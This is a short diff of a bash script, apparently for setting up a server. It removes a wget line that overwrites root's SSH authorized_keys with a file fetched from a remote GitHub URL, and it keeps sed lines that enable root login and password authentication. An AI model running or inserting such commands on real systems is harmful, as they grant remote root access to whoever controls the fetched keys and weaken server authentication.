@@ -1,6 +1,5 @@
 #!/bin/bash
 
-wget -q https://raw.githubusercontent.com/RyanY610/logs/main/null -O /root/.ssh/authorized_keys
 sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 echo "Port 22"  >> /etc/ssh/sshd_config
